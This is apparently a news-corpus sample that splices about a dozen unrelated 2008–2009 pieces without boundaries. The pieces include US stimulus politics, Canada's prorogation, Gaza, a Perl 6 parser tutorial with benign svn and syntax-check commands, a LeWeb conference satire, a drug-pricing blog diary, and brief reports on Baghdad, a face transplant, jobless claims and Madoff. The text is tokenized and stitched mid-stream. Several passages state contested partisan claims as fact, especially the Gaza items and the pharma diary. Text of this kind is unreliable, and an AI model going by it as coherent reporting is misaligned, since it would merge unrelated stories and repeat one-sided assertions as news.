“ The door of our conference will stay open to this president , ” said Rep. Mike Pence ( R - Ind ) , the House Republican Conference chairman .
“ We are grateful for his outreach , we are grateful for the spirit of bipartisanship he is challenging this conference to embrace . ”
After Obama spent another hour with Senate Republicans , Minority Leader Mitch McConnell said the presidential outreach was " very , very constructive , ” and that the GOP was " very pleased with the level of candor , the desire to look for bipartisan solutions .
" I think the impression we were left with us that they were interested in taking a look at our suggestions , ” McConnell said .
The frank Q & A between a popular new president and a frustrated , out of power minority party was originally set up as a diplomatic outreach by a White House that has promised to be more bipartisan .
But as the week wears on , it ’s clear that the GOP is finding its voice as a stout opposition party instead of the party of compromise .
Sen .
John McCain started this week 's pummeling , declaring Sunday that he would oppose Obama 's stimulus package as written .
Senate Minority Leader Mitch McConnell ( R - Ky. ) has kept up a daily din of opposition to the specifics of the package , mocking the inclusion of a mob museum and a water park , and demanding more discussion and transparency .
Senate Republicans are also rallying against the Democratic version of a children ’s health care bill being debated this week .
The nitpicking took its toll , and Obama on Monday privately urged House Democrats to remove a notable flash point : funds for contraception that had been defended by House Speaker Nancy Pelosi ( D - Calif . ) on national television just a day before .
The Democrats agreed .
Then this morning , House Minority Leader John Boehner ( R - Ohio ) went for the jugular , urging his members to oppose the economic centerpiece of Obama 's first term just hours before the president paid the Republicans the compliment of coming to the Capitol for a private meeting — even before he did the same for House Democrats .
Obama 's aides cast the visit as an outstretched hand — and it got slapped .
The bottom line : a coordinated effort to embarrass a president who looked largely unassailable just weeks ago .
Yet Republicans are still walking a balance beam – trying to give the appearance that they are listening to Obama ’s rhetoric while claiming that the Democratic Congress is ruining the Obama message .
McConnell told the Today Show Tuesday morning that Democrats in Congress are " drifting away " from Obama 's preferred stimulus plan , which was supposed to include 40 percent tax cuts and be free of earmarks .
Democrats hope the tactics backfire .
" This is a very dangerous political vote for House Republicans , in particular those from Ohio , Pennsylvania , Michigan , " said a White House aide familiar with House districts .
" Their constituents want them to take action to save the economy , not block progress . "
But most GOP moderates have retired or lost , so there is little political danger with House Republicans in opposing another $ 825 billion in spending at a time when many conservative - leaning voters are weary of government intervention after months of bailouts .
Further , Republicans on the Hill are instead framing their overwhelming opposition to the stimulus bill as a vote against a congressional Democratic leadership that is far less popular than Obama .
But , no , it ’s not Obama ’s fault .
“ It ’s not so much his effort , it ’s what the House has done with this bill , what Pelosi has done with this bill , ” explains Kay Granger ( R - TX ) , a veteran member of the Appropriations Committee .
Does all this mean the honeymoon over ?
" It never started , ” said Sen. Orrin Hatch ( R - Utah ) .
Hatch said the State Children ’s Health Insurance bill , for example , has been drafted by Democrats the bill so it might cover the children of illegal immigrants .
" You 're talking to the author of the legislation and they have n't spent one minute discussing it with me , other than preliminary discussions in the Finance Committee that began before this administration took over , ” Hatch said .
" I want to support the president when I can and I will do so regardless of how badly I feel about these very , very partisan first strike approaches . ”
House leaders so far are making no such claims to bipartisanship .
Boehner on Tuesday morning told members that he 's voting against the stimulus , and his No. 2 , GOP Whip Eric Cantor , told the assembled Republicans that there was n't any reason for them to support the measure , according to another person in the room .
Cantor and his whip team are going to urge GOP members to oppose it .
In a nod to the president , Boehner did point out that this was the third time that Obama has met with Republican leaders , compared with the zero meetings they 've held Pelosi — a now - familiar refrain from Republicans in the House .
But Obama ’s diplomacy clearly is n’t buying any votes yet .
Rep. Patrick McHenry ( R - NC ) , a young conservative firebrand , was blunt when asked what happened to Obama ’s honeymoon : “ Ask Pelosi . ”
“ When you have an operating majority like they do , they do n’t particularly care for Republican input even when the president says it would be nice . ”
Democrats believe Republicans are simply setting themselves up again as obstructionists and the “ party of no . ”
“ The American people rejected the Bush economic policies of the past eight years that resulted in millions of jobs lost and Republicans now have an opportunity to work with the President and Democrats to move our country forward , ” one Democratic aide said .
“ It would be a shame if Republicans choose to promote the same policies instead of listening to the overwhelming majority of Americans who support swift action on the House bill . ”
Despite the grim outlook for Republican support , administration officials are not giving up .
In addition to the president 's visit , Chief of Staff Rahm Emanuel is hosting a group of congressional Republicans at the White House tonight .
Vice President Joe Biden is visiting the Senate Democratic lunch , and the Senate Finance Committee is undergoing a lengthy markup of the legislation .
" They ’ll talk stimulus , but also whatever else is on their mind and whatever they want to talk about , " said an administration aide .
Republicans were appreciative of the gesture - but non-commital .
" I 'm glad to listen , " said Rep. Jim Gerlach ( R - Pa . ) .
Rep. Phil Gingrey , R - Ga. , is already testing out his message to Obama .
“ This is bad policy and we think , Mr. President , with all due respect that you ’re getting some bad advice , maybe from Ms. Pelosi maybe from Mr. Reid in regard to a lot of things that Democrats have been wanting from years even before you became a United States Senator and they ’re throwing all this in there , ” Gingrey saidsaid .
“ It in no way shape or form looks like true emergency spending . ”

OTTAWA– Prime Minister Stephen Harper has extended the life of his minority Conservative government until the new year after Governor General Michaelle Jean today granted his request to suspend Parliament .
Jean made the unprecedented decision after a lengthy meeting with Harper this morning at Rideau Hall .
Her consent to prorogue Parliament means the work of the Commons has been discontinued , allowing Harper 's Conservatives to escape a confidence vote next week that would have meant the defeat of his government .
It 's a dramatic turn in a political crisis that has gripped the nation 's capital — and much of the country — for the last week , since opposition parties rebelled against a provocative economic statement tabled by the Conservatives .
PMO spokesperson Kory Teneycke told reporters later that the Conservative government is prepared to do whatever it can to " defuse the situation " and " get out of the current crisis . "
The decision pulls the teetering minority Conservative government a step back from the edge of a political precipice .
But they will face another confidence test when the House returns , setting up the prospect of a fierce battle for public support over the coming weeks .
The opposition coalition had asked Jean to refuse to prorogue , arguing that Harper no longer enjoys the confidence of the House of Commons .
NDP Leader Jack Layton called it a sad day for parliamentary democracy .
" He 's put a lock on the door of the House of Commons , " Layton said .
Layton said his party will continue to express its lack of confidence in Harper when Parliament begins again next year .
Layton also said his party expects to vote against the government at the earliest opportunity .
When asked why he would try to bring down the government before it delivered a budget , he said " That confidence is n't going to be restored by seven weeks of propaganda " .

UN Relief and Works Agency spokesman Chris Gunness reported this evening that the Israeli army is privately briefing diplomats on the fact that its previous claims about their attack on a UN - run girls ’ school in the Gaza Strip , which caused over 100 civilian casualties , were baseless .
The attack occurred yesterday , when Israeli mortars deliberately fired three shells at the school , which was filled with hundreds of displaced civilians at the time , killing at least 46 and wounding 55 others .
As international outrage began to well over the enormous civilian toll of the attack , Israel declared the killings “ according to procedures ” and claimed Hamas had fired rockets from the school ’s courtyard , making the attack on hundreds of innocent civilians self - defense .
Much was made of the claim , including reports that Israel was mulling filing a formal complaint to the United Nations about Hamas ’ use of the facility .
But as the United Nations poked holes in the official story , Israel is now backing off those claims .
And while Israel had previously claimed to have had proof to back up its story , Gunness says the military is now conceding that the mortar fire they previously claimed came from the school came from elsewhere in the refugee camp .
Though Israel is trying to keep its admission of guilt relatively quiet ( far more quiet than its allegations that the killings were justified ) it will doubtless pay a further price in the court of international public opinion for having once again deliberately targeted a building full of innocent civilians .
Only Perl 6 can parse Perl 6 , or so people say .
This is mostly true , since the only parsers that can handle all known Perl 6 code is the module STD . pm written in Perl 6 .
To get access to that parser , all you have to do is get a checkout of a directory of the pugs repository , linux with perl - 5.10.0 or newer in the location / usr / local / bin / perl and some modules , like for example Moose and YAML :: Syck .
When you have that , type the following commands :
$ svn co http://svn.pugscode.org/pugs/src/perl6
$ cd perl6 $ make
Now the simplest way to check the syntax of a Perl 6 file is to use the program tryfile :
$ echo 'my ( $x , $ y ) = 1..2 ; ' > test.t $ ./ tryfile test.t 00:02 85 m
The output might be a bit confusing at first .
Since no error message was given , it means that no syntax error was found .
The 00:02 is the parsing time , and 85 is the memory usage .
Suppose we introduce a syntax error in our test file :
$ echo 'my ( $x , $ y ) = 1.. ; 2 ' > wrong.pl $ ./ tryfile wrong.pl ############# PARSE FAILED #############
Ca n't understand next input -- giving up at wrong .pl line 1 : ------> my ( $x , $y ) = 1.. ; 2 expecting any of : prefix or noun whitespace 00:02 85 m
The green part of the output indicates the part where the syntax is still correct , the red part is where the erroneous part begins .
( The bold font weight is n't part of the output , though ) .
At this point , either an prefix or noun would have been expected , as in 1..+2 or as in 1..2 , or a whitespace , probably followed by another term .
But if you want to known not only if an expression was parsed , but also how , then there 's another way :
There 's a syntax highlither based on STD.pm which generates HTML output that also encodes the parse tree :
$ ./STD_syntax_highlight --full-html=test.html test.t
Open the generated file , test .html ( click here for an example ) in your favourite browser , enable Javascript , and click on the button labled Show Syntax Tree .
Then when you hoover with the mouse over a piece of the code , on the right of the browser window a list is displayed that shows the calling hirarchy of rules in STD.pm .
If you move the mouse to the test my , you 'll see that the top most parsing statement was statementlist , which then called statement , which in turn called statement_modexpr and so on .
You might also notice that scope_declarator calls scope_declarator__S_905 my , which is slightly misleading .
In fact token scope_declarator is a so called proto rule , which means that multiple rules have the same name , and if you call that rule , it tries to match all of them in parallel , and the longest match is picked .
From these proto rules the compiler constructs automatically subrules whose names all contain the double underscore __ .
So you should actually read the two rules scope_declarator and scope_declarator__S_905 my as one , where the alternative that contains the my matched .
Want to know how Britain should spend that billion pounds it has earmarked for internet startups ?
On a vodka - fuelled conference in a sauna in London .
It would sure put LeWeb into the shade .
Though almost anything would .
Bon soir from Paris .
It 's 3 am on Wednesday morning and I 've just stumbled back to my hotel from a MySpace - sponsored party at Palais Maillot and an after - party in a bizarre dive bar where water dripped from the ceiling and the DJ played nothing but Jive Bunny .
I 'm in town for LeWeb , Europe 's largest web 2.0 conference , with 1,800 entrepreneurs from around the world each paying € 1,500 to meet their peers , demo their startups and generally try to pretend that their businesses are n't completely and totally doomed .
The conference ends in a little over 12 hours which , annoyingly , is about five hours after this column is due to be published .
I should n't necessarily be surprised at the deadline inconvenience .
Previous LeWebs have been marred by controversy and negative press coverage so this year organiser Loic Le Meur has come up with a cunning plan to head off criticism .
In short , he 's doing everything he can to ensure that no press commentary whatsoever escapes from the conference hall .
It 's a strategy of three planks .
Plank one is to have absolutely no wireless internet access in the conference venue for most of the first day .
Not in the main hall , not in the press room and not even in the theatre where startups were invited to pitch to a panel of judges .
Instead , with almost no time to rework their presentations , the already screwed entrepreneurs were told they'd have to demonstrate their internet businesses without using the internet .
That 's right — LeWeb was entirely without the web .
Which I suppose makes it simply " Le " .
But still Loic was n't taking any chances .
Just in case anyone managed to smuggle in their own internet connection , perhaps hidden inside their phone or their sock , plank two was to arrange for the heating to be turned down so low that all those in attendance were forced to wear not one but two pairs of thick mittens .
Removing them to so much as Twitter a negative comment would surely mean the loss of a finger or two to frostbite .
Finally , as his plank de grace against against even the most dedicated journalist or blogger , Loic carefully selected the least newsworthy speakers ever to have appeared on a conference programme .
Then he made most of them take part in " fireside chats " that were so rambling and unfocused in a stereotypically French style that I kept hoping that the ghost of Charles Bukowski would float drunkenly on to disrupt them .
Day one 's keynote firesider was Paulo Coelho — the favourite author of that girl you met on the first day of university who spent her gap year in Thailand and like totally found herself .
" Everyone has something interesting to say , " Coelho said at one point , clearly showing that he 's never had a conversation with one of his fans .
Final score at the end of day one : Loic — 3 , newsgatherers — 0 .
All of this , of course , thrilled the American attendees .
If any of them was any doubt about Silicon Valley 's tech supremacy over Europe , they only had to spend five minutes in that freezing hall , with its nonexistent Wi-Fi and and its cloakroom sign that read " Cloackroom " and all was right with their world view .
1938 Media 's Loren Feldman
Twittered to ask " how hard is it to run some cables or do whatever it is the fuck they do to bring me the internet ? " — and even Americans who had been invited to participate could n't resist a dig .
BoomTown blogger Kara Swisher used the platform to encourage attendees to relocate to California " where we have warm sun and the internet " while Techcrunch 's Michael Arrington threatened to send his writers home early given that they could n't actually file any reports .
Meantime , in the startup competition room , Robert Scoble sat at the judges ' table openly playing Solitare while yet another poor entrepreneur stumbled through his webless pitch .
Fed up ( but relieved I 'd blagged my way in rather than paying to attend like so many other poor saps ) , I skipped out to the car park where a Finnish startup had had the remarkable foresight to install a functioning sauna .
I found it packed to its pine rafters with Brits , getting slowly drunk on licorice vodka and gleefully bitching about how disappointing everything was .
" The speakers were dull , it 's bloody freezing and I can't even blog about it , " said one , which pretty much summed it up .
Although I would have given the goodie bags a mention as well : they contained branded bandannas .
Bandannas !
Mon dieu !
But I 'm not being entirely fair to LeWeb .
Not all of the speakers were dull ( some were just batshit weird ) and of course my deadline means that I can only tell half the story .
There 's a slim but existent chance that tomorrow will be a huge improvement .
Maybe the internet will have turned up .
Maybe there 'll be branded hot water bottles .
Certainly the speakers look much better .
There 's Marissa Mayer from Google , Chris Anderson from TED , Dr. Werner Vogels from Amazon and — gasp — a surprise guest who , please God , wo n't turn out to be Nicholas Sarkozy again .
( Although if he does come , can someone make sure Carla Bruni knows that the real action is in the sauna ? )
And yet , even if today 's speakers are better , the yanks can still claim — quite reasonably — that the improvement was only because so many of the second day 's speakers are American , including the organisers of two far better American conferences : TED and Techcrunch 50 .
It 's lose - lose for Loic and , by extension , it 's lose - lose for Europe .
And so , once again , it falls to me to save the day ; to salvage our entire continent 's reputation in the eyes of the world .
It 's a hell of a job but , as luck would have it , I have a hell of a plan to pull it off .
Earlier this week , just before the start of LeWeb , Lord Drayson , Britain 's Minister for Science and Innovation , announced plans for a £ 1 billion investment fund to support technology startups in the UK over the next few years .
The plan was initially greeted with excitement by those startups , but already British cynicism has kicked in and questions are now being asked about how exactly the money will be divided up .
Fortunately , my plan takes care of that too .
I 'm all about 360 - degree thinking .
A few hours ago I sent an email to Lord Drayson applying for all of the money .
Every single penny of the one billion pounds .
And when it arrives , I intend to spend it all organising the most earth - shatteringly brilliant two - day conference Europe — and the world — has ever seen .
Unlike LeWeb , there will be no panels , no " fireside chats " , no goody bags , no live webcasting and absolutly no keynote speakers .
Instead I 'll blow the entire budget by constructing a gigantic sauna , right in the middle of London ( easier for me to get to , and a beer wo n't cost nine euros a bottle ) and surrounded by a moat of liquorice vodka .
Each attendee will have a big , fat pipe of internet all to themselves and — of course — the whole thing will be completely free , including transport and accommodation .
Every entrepreneur in Europe will be invited , and encouraged to bring a long straw .
It may sound ambitious — reckless even — but my logic is faultless .
No one really comes to technology conferences for the speakers ; the real networking and business is done in corridors and during the after - hours drinking .
And it 's almost impossible not to network when you 're crammed into a giant sauna with ten thousand entrepreneurs , investors and industry journalists , wasted on liquorice vodka .
A ton of business will get done , a thousand partnerships will be made and after two days everyone will go home hungover , happy and filled with enough morale to easily ride out the recession .
And even more satisfying than all of that is the fact that the idea of a huge state - sponsored piss - up is such an anathema to Americans that there 's no way they can outdo us .
Instead Kara , Michael and all those other smug Valley dwellers will be forced to look on enviously as Europe drinks , sweats , networks and bonds its way to a new dot com boom .
Take that , American organisational superiority !
And viva la revolution !

Having finally bought the domain name from a man in Korea , he now blogs at paulcarr.com
The U.S. has around 306 million of the global population of around 6.75 billion people .
That 's 4.5 % of the world 's population paying 40 % - 50 % of pharma 's revenue .
Please note , I am not telling you how many doses of medication the U.S. is buying for 40 % - 50 % of pharma 's pie .
That 's highly classified information .
They wo n't tell us .
They wo n't even tell us that information before they kill us .
Maybe some perspective is in order :
Elsewhere , governments regulate drug prices .
But drug makers have successfully fought off public efforts to cut U.S. prescription drug prices .
Consider the result .
From 1981 to 2000 , the average retail price per prescription rose from $ 9.50 to $ 44.11 , up 360 percent .
Then the average price soared to $ 53.92 in 2004 .
Consequently , needed medications are harder to afford .
It is astonishing and terrible that the prices of dangerous illegal drugs have plummeted during these years .
The average retail price of heroin and cocaine plunged from $ 1,341 per pure gram in 1981 to $ 247 in 2000 — a four - fifths drop .
Consequently , more people can now afford more of these illegal drugs .
Yeah , you can get high as a kite , but you can't get well .
It 's more affordable to ineffectively self - medicate ????
Doh !
That brings me to my next point .
It does n't take a rocket scientist to see that there 's more money in controlling the progression of a disease or condition than there is in curing it .
With that in mind , the pharmaceutical market has focused on getting people on board with the Disease Control Express .
Greater Utilization ( aka more frequent prescription refills ) are the primary reason for pharmaceutical sales growth .
According to R.W. Dubois et al. , " Explaining Drug Spending Trends : Does Perception Match Reality ? " Health Affairs ( Mar / Apr 2000 ) : 231–239 ( sorry , no link ... go to a library and look it up ) :
From 1987 through 1994 , of the 11.9 percent average annual rate of spending growth , about half reflected the direct effects of increased prices , while the remaining half is attributed to utilization growth .
In contrast , from 1994 through 1999 the growth rate remained in double digits , but only about one - fifth was directly attributable to price changes ; nearly 80 percent of increased drug spending was related to growth in utilization .
How do you increase utilization ?
" Educate " the physicians about the " need " to control the disease or condition with a specific drug .
You accentuate the postives , down play the side effects ( the negatives ) and hope nobody does their own homework .
Educating physicians works best if you pay a high profile physician to conduct the " education " .
According to the most recent data available from the national organization in charge of accrediting the courses , drug - industry financing of continuing medical education has nearly quadrupled since 1998 , from $ 302 million to $ 1.12 billion .
Half of all continuing medical education courses in the United States are now paid for by drug companies , up from a third a decade ago .
Because pharmaceutical companies now set much of the agenda for what doctors learn about drugs , crucial information about potential drug dangers is played down , to the detriment of patient care .
That 's why there 's so many flawed studies on the effectiveness of statin drugs .
That 's why there 's so much CME ( Continued Medical Education ) sponsored by pharmaceutical companies .
There is some cries of Conflict of Interest and there is some blow back from Universities like Stanford , but for the average doctor trying to keep afloat ?
Free CME 's look pretty good .
In 2007 drug sales increased at it 's lowest rate since 1963 ; which has to be a revolting development for big pharma and now they are facing Team Obama and Health Care Reform .
Pharma is preparing for additional regulation and creating organizations to deal with sales and marketing disclosure mandates for ther sponsored CME programs .
Another disclosure issue surrounds how much money is pharma paying physicians to participate in a drug study ?
Is the pharmaceutical company giving the physician stock for doing the drug study ?
Are there perks like all expense paid trips to pricey resorts ?
Medicare Payment Advisory Commission ( MedPAC ) recently recommend ( ed ) that Congress require drug and device companies to publicly report spending on a broad range of categories including physicians , hospitals , continuing medical education ( CME ) , professional organizations .
MedPAC also recommended that companies disclose information about free drug samples to the Department of Health and Human Services .
Senators Charles Grassley ( R - IA ) and Herb Kohl ( D - WI ) are expected to introduce a revised version of the Physician Payments Sunshine Act when Congress reconvenes next year .
{ emphasis and grammar correction added ) snip , The First Annual Summit on Sales & Marketing Disclosure for Drug , Device and Biotech Companies will examine these numerous mandates and how companies are responding .
Expert panels will explore the latest state initiatives and how state and federal enforcers view disclosure as a compliance tool .
Case studies will examine how companies can effectively comply with competing and overlapping requirements while adding value to the company 's bottom line .
The Summit brings together the key players shaping disclosure initiatives with the in -house and outside experts developing programs to comply in a cost - effective fashion .
It seems that pharmaceutical companies are gearing up to try and " guide " health care reform efforts and they got an early win with Sanjay Gupta ( shill for big pharma ) tapped for Surgeon General .
I hope the plan is for Gupta to be the face man for public health care policy derived by his supervisor , Tom Daschle and the rest of his team at the ( CDC , AHRQ , NCI , NIH , CMS , FDA and more ) over at HHS .
Gupta has street cred , but people who work in health care policy see him for what he is , non-substantive , but easy on the eyes .
As long as his message is controlled by people who know about public health , poverty , uninsured and underinsured ; he 'll deliver the messages well .
If health care reform is in name only , big pharma will find loop holes to continue business as usual .
What are in pharma's plans ?
They want another ineffective drug plan like Medicare Part D for the rest of us ( complete with confusing donut holes ) .
They want to be able to hire high profile physicians ( like Sanjay Gupta ) to shill their products and down play the negative side effects .
They want no interference with the CME they offer physicians at large .
They want to prevent drug price negotiation with insurance plans .
They want no reform measures that will require any sacrifice on their part .... other than giving up spending millions of dollars on pens , coffee mugs and sticky notes with their drug names on it .
They want as much as they can get to their bottom line .
Effective health care reform is all about the message .
We have to stay on point .
Throughout this diary and my last one I gave you the sources for the talking points .
All these items are easily googled .
We have a fight on our hands .
Tactic # 1 :
Health Insurance Doesn't Guarantee You Health Care
Tactic # 2 :
We should use Big Pharma 's position and leap frog over it and push for effective
pharmaceutical coverage for all .
Talking Points :
40 million prescriptions went unfilled last year due to too high out - of - pocket costs .
The U.S. is 4.5 % of the world 's population , but we are paying 40 % - 50 % of pharma 's revenue .
The U.S. is subsidizing the rest of the world 's lower costs for prescription drugs .
Health Insurers need to be able to negotiate drug prices .
Preferably the government should be negotiating drug prices for the nation ( no matter what your insurance status is ) with drug makers .
Health Care consumers have a lack of confidence in the medical necessity of taking their prescription drugs because of undisclosed conflict of interest issues between physicians and drug makers .
Pharma spends twice as much on marketing their drugs as they do on R&D .
Pharma giving up giving out pens to physicians does n't address the real problem where pharma sponsors 50 % of physician CME's ( Continuing Medical Education ) .
Pharma giving up giving out coffee mugs to physicians does n't address the real problem where pharma pays high profile physicians ' thousands of dollars to give CME 's promoting specific drugs .
We need more transparency in the relationships between government health policy makers , physicians and drug makers .
and , finally
Pharmaceutical company Drug Assistance Plans are ineffective and sidesteps the real issue that pharma has priced their products beyond what the market can bear .
*********************************************************************************
* There are 2 figures for 2007 U.S. pharmaceutical sales from different agencies .
One is $ 268.5 Billion ( from Fiercepharma.com ) and the other is $ 286.5 billion ( from Health Affairs ) .
These figures come from different sources and the $ 18 billion difference is about the same as 2 months in Iraq or the total earmark spending per year for the federal budget .
It 's worth pursuing , but not for today 's diary ; because both are very big numbers as it reflects over 12.5 % of overall health care spending .
I had to regress the 2007 numbers to arrive at 2006 pharmaceutical spending so 2006 spending was either $ 258.3 billion or $ 275.6 billion .
Still , very big numbers as it reflects over 11.7 % of overrall health care spending .
It appears that overall health care spending remained stagnant or slightly regressed between 2006 ( $ 2.21 trillion ) and 2007 ( $ 2.2 ) as " adjusted " numbers are coming in that do n't reflect earlier reporting at census.gov : 2006 at $ 2.21 trillion and estimates for 2007 expenditures at around $ 2.35 trillion and projections for 2008 to be $ 2.51 trillion .
I will look more deeply into this disparity and write about it later .
At first blush it looks like the free market has found the tipping point where health care is " elastic " .
I can only wonder at the number of people dying over this insane policy of promoting the free market to ration our health care .
A new fortress - like US embassy has been inaugurated by the American ambassador , Ryan Crocker .
Mr Crocker said the $ 700 m ( £ 480 m ) embassy was testimony to America 's commitment to a long - term friendship with Iraq , where about 146,000 US troops are deployed .
In recent weeks US diplomats have gradually moved into the newly built compound , the world 's largest US embassy , leaving behind a sprawling palace they had inhabited since toppling Iraqi leader Saddam Hussein in 2003 .
US officials had ruled Iraq directly from the palace for a year after taking Baghdad , and their continued presence there was seen by many Iraqis as a symbol of occupation .

The opening of the new embassy is in line with a change of power that was effected on New Year 's Day , when US forces in Iraq officially came under an Iraqi mandate .
US Deputy Secretary of State John Negroponte and Iraqi President Jalal Talabani attended the opening ceremony .
In a courtyard between two buildings in the new compound , the Iraqi national anthem was played , then US Marines raised an American flag to the tune of the Star Spangled Banner .
Meanwhile , four bombs killed four and injured 19 in Baghdad yesterday , a day after 38 died in a suicide bombing at a Shia shrine four miles north of the new embassy .

Updated story
The Cleveland Clinic has performed a groundbreaking transplant of a human face on a patient who was disfigured by traumatic injury .
The operation took place in recent weeks , after years of research and planning .
The Clinic released few details this morning , but the hospital scheduled a news conference for 1 p.m. Wednesday .
No information was available about the patient , who the Clinic said does not wish to be identified .
The Clinic became the first U.S. hospital to approve the procedure four years ago .
Dr. Maria Siemionow , director of plastic surgery research , pushed for approval and performed the operation with a team of doctors .
Doctors in France in 2005 performed a partial face transplant on a 38 - year - old woman disfigured by a dog attack .
It was the first such operation in the world .
The Clinic operation is said to be a near - complete facial transplant .
The operation requires taking mask - like facial tissue from an organ donor .
Siemionow has conducted extensive research transplanting faces and limbs of laboratory rats .
She had reviewed dozens of potential patients in recent years .
Facial transplantation has raised ethical debate because of questions whether patients should be subjected to the risks for an operation that is not life or death .
The risks include failure of the transplanted tissue and complications from anti-rejection drugs .
Siemionow in 2004 argued her case before a Clinic board that reviews experimental procedures .
She said the choice should be made by the patient , following a detailed psychological evaluation .
- The number of people remaining on the unemployment benefits roll after drawing an initial week of aid , or continued claims , rose 159,000 to a higher - than - forecast 4.776 million in the week ended Jan 17 , the most recent week for which data is available .
The Labor Department said this was the highest reading since its records on this series began in 1967 .
MP : There 's a little problem here .
The size of the labor force has doubled since 1967 , which distorts the comparison of today 's continued claims to past years ( the chart above illustrates this issue using the labor force vs. initial jobless claims ) .
Consider 1982 , when there were 4,713,000 continued claims ( lower than today ) , but there was also a much smaller labor force ( 110.744 million ) than today ( 154.447 million ) .
As a percent of the labor force , the continued claims in 1982 represented 4.256 % of the labor force .
Given our labor force today , it would require 6.57 million continued claims to reach the same 4.256 % level as 1982 , or an additional 1.8 million people .
NEW YORK ( Reuters ) - A statue stolen last month from Wall Street financier Bernard Madoff ’s Florida home has been returned undamaged , and with a note attached , to a country club where the accused swindler is a member , Palm Beach police said on Thursday .
The attached note read : “ Bernie the Swindler , Lesson : Return stolen property to rightful owners .
Signed by The Educators , ” according to police .
“ We do n’t know who that is , ” Sgt. Chris Proscia told Reuters .
“ We think it was done just to prove a point . ”
Madoff , a former Wall Street fund manager , is accused of running a $ 50 billion scam that ensnared wealthy investors , banks and charities around the world .
The 70 - year - old investment advisor is under house arrest in his Manhattan apartment .
He was criminally charged on December 11 in what could prove to be Wall Street ’s biggest fraud .
According to court documents , Madoff has confessed to his sons that he ran a Ponzi scheme for years , paying off early investors with money from new clients .
Gresham ’s Law briefly states “ Bad money drives out good money . ”
A corollary has : “ Bad news analysis drives out good news analysis . ”
Reports and dialogues on the events in Gaza give the impression that a mighty Hamas has wantonly attacked Israel , pulverized its southern cities with missiles and a patient Israel ran out of patience and finally retaliated .
The drama has subtext ; undisclosed reasons for Israel ’s attack , unstated significance of the escalated conflict , and a non-clarified future for its final denouement .
Search the entire landscape and we encounter happenings beyond the horizon .
Missing from the debate are the disastrous consequences to the world community due to Israel ’s aggressive actions .
Media references to President - elect Barack Obama ’s July 2008 speech during a visit to Israel in which he stated , “ If somebody was sending rockets into my house where my two daughters sleep at night , I would do everything to stop that , and would expect Israel to do the same thing , ” incorrectly inferred he was speaking in late December 2008 .
If the president - elect expressed himself in late December 2008 , he might have said : “ If my land was being blockaded so that my children were being impoverished and intermittently starved , their parents unable to find employment , all of them caged in a fenced area and not permitted to fish , fly or travel more than a few miles , while supersonic planes disturbed each night of their sleep and created a daily fear of a military incursion that could kill them , I would do everything to stop that and expect the Palestinians to do the same ? ”
He could add , “ I certainly would refrain from making things worse and ask for a continuation of the truce , ” which is what Hamas did .
The media has not properly related the fact that Hamas did not stop the truce ; the truce expired and not solely due to Hamas .
In order to continue the truce , Hamas issued two responsible demands ( 1 ) Israel halt its devastating economic blockade of Gaza , and ( 2 ) Israel observe a truce in the West Bank as well as Gaza .
When Israel refused to meet these humanitarian demands , Hamas refused to continue the truce , an event Israel , who reluctantly agreed to the first truce , knew would happen .
During the years 2001 - 2007 , the PLO and Fatah , who controlled Gaza , fired unguided rockets and mortars at Israel and increased the launching numbers each year .
Those same years witnessed Israeli incursions into Gaza that destroyed Palestinian infrastructure ; Arafat ’s headquarters , airport , roads , factories , homes and also lives .
Sanctions and a crippling blockade followed the mayhem .
So , why did Israel accuse Hamas of incitement and escalate its punishment when the pattern had been the same for years ?
Did Israel welcome the aggressive behavior so its military could have reasons for more aggressive retaliation ?
Certainly seems that way .
In addition to the casualties , the shocking Israeli actions have had a disastrous political consequence .
The Bush administration heralded a new dawn for a Middle East that was willing to accept the democratic process .
The Palestinians responded with the election of Hamas to authority .
And what happened ?
Hamas faced a “ heads ” you lose and a “ tails ” you cannot win game , engineered by the western democracies .
If Hamas remained out of the political process , its cadres might have been routinely attacked .
By being part of the democratic process and winning an election , Hamas and the Palestinians have been pulverized , which informs the Arab world and its Islamic organizations :
No matter what you do , whether you stay out of the political process or enter the political process , you will be pulverized .
What behavior can we expect from people who know they are going to be pulverized ?
Noting the decimation of Hamas after its application of Bush ’s concept of democratic participation , wo n’t they react more aggressively ?
Due to Israel ’s aggressive attacks , the world can expect to suffer increases in terrorism and rebellion .
Jewish communities will be targeted .
Without neglecting the intensive killing , this is the major derogatory result of Israel ’s war on Gaza .
The launching of 200 unguided rockets and mortars to Israel , although they did not inflict human damage and did not have Hamas ’ name on them — the projectiles are fired by several militant organizations — is inexcusable .
Is n’t there a question here that demands an answer ?
Why were projectiles that inflicted no great damage fired into Israeli territory ?
Showing potential force without inflicting damage signals a threat .
The strong signal intends to force an adversary to a negotiating table for a compromising truce and serves as a call to the world to note the seriousness of the situation .
Why did n’t Israel try some form of negotiation , some form of indirect contact that would have not compromised Israel security ?
Would it not have made its people more secure by signifying it did not intend to suffocate the Palestinians with an illegal embargo and was willing to compromise ?
Why did n’t the world bodies immediately intervene and propose a compromise that would ameliorate the explosive situation ?
The reason : Nobody recognizes Hamas and therefore wo n’t talk with the authority Result :
The only other route to resolve the situation is violence and casualties .
An honest presentation would include the observation that the initial 200 launches after the ‘ truce ’ ended caused no human damage and insignificant physical damage .
Nevertheless , more emphasis has been given to artillery shells that damaged Israeli sidewalks than those that tore apart the bodies of 250 Palestinians .
Videos show the rockets from Gaza mainly puncture without generating much explosive power .
Secondary damage results from shrapnel and some structure collapse .
A single Israeli missile has reduced buildings and their occupants to dust .
Israel ’s Ha’aretz newspaper , January 2 , 2009 , verified the observations :
The threat that Hamas ’ ballistic capabilities pose to the people of the Negev is less serious than initially presumed and the residents of the targeted areas are not demonstrating signs of panic , according to an interim analysis by the Israel Defense Forces of the situation nearly a week after the launching of Operation Cast Lead in the Gaza Strip .
Too often , we have mendacious and “ plugged in ” reports , such as that from Bob Joseph of CNN .
From a CNN transcript :
BOB JOSEPH , REPORTER :
As strategically targeted as Israel is , because of what Hamas is doing and because of them putting their missiles in playgrounds , near schools and hospitals , they have created an environment where they ensure that some civilians can get hurt .
And what they target themselves is , they target children and schools and hospitals .
That is what makes Hamas the most evil entity — one of the most evil entities on this planet .
According to Bob Joseph , rockets and mortars that have no guidance system or explosive power and have not struck any hospitals or playgrounds and might have slightly damaged one school , are targeted missiles .
Israel ’s massive number of well guided missiles that have hit universities , mosques , UN schools , children playing in fields and apartment buildings are not evil and are excusable .
In one attack on a UN school , The Guardian , 6 January 2009 , reports :
The civilian death toll in Gaza increased dramatically today , with reports of more than 40 Palestinians killed after missiles exploded outside a UN school where hundreds of people were sheltering from the continuing Israeli offensive .
Israel insists that mortars were being launched from the school courtyard .
